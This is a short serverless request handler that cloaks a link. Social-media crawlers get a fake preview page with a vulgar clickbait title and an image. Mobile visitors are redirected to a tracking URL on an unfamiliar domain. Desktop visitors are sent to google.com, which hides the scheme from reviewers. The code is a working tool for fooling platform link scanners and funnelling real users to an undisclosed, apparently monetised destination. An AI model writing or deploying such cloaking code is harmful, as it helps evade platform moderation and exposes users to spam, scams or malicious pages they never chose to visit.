export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <meta property="og:title" content="Chora photo jo Lan  na kha">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://deirwzouuhpjfmsyuihb.supabase.co/storage/v1/object/public/sdgdffd/00fb287b-2b66-47ed-a0fc-e1a862d1809d.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
